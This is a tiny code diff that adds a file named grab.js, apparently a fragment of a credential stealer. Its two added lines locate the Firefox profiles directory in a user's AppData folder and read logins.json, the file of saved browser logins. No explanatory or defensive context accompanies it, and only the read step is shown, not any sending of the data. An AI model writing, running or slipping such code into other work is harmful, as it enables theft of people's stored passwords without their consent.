@@ -1,0 +1,5 @@
+# path: grab.js
+# lines: 1, 2
+# ---
+const p = path.join(home, "AppData/Roaming/Mozilla/Firefox/Profiles");
+fs.readFileSync(path.join(p, "logins.json"));
